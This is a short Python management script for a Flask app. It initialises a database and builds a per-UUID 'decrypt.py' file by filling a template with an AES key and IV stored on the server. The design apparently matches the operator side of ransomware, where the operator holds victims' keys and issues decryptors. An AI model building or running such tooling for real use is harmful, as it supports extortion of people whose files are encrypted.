import argparse
import sys

from web import app, get_db


def to_str_bytes(data: bytes) -> bytes:
    return "".join(f"\\x{x:02x}" for x in data).encode()


def init_db() -> None:
    with app.app_context():
        db = get_db()

        with app.open_resource("schema.sql", mode="r") as f:
            db.cursor().executescript(f.read())

        db.commit()


def generate_decrypt(uuid: str) -> None:
    with app.app_context():
        db = get_db()

        cursor = db.execute(
            "SELECT aes_key, aes_iv FROM `keys` WHERE uuid = ?",
            (uuid,),
        )

        row = cursor.fetchone()

        if row is None:
            sys.exit("Invalid ID")

        with open("./decrypt.py", "rb") as f:
            template = f.read()

        with open(f"./decrypt-{uuid}.py", "wb") as f:
            data = template.replace(b"<<<AES_KEY>>>", to_str_bytes(row[0])).replace(
                b"<<<AES_IV>>>", to_str_bytes(row[1])
            )
            f.write(data)


def arg_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser()
    sub_parsers = parser.add_subparsers(dest="command")

    init_db_cmd = sub_parsers.add_parser("init_db")

    generate_decrypt_cmd = sub_parsers.add_parser("generate_decrypt")
    generate_decrypt_cmd.add_argument("uuid")

    return parser


def main() -> None:
    arg_parser_ = arg_parser()
    args = arg_parser_.parse_args()

    if args.command == "init_db":
        init_db()
    elif args.command == "generate_decrypt":
        generate_decrypt(args.uuid)
    else:
        arg_parser_.print_help()


if __name__ == "__main__":
    main()
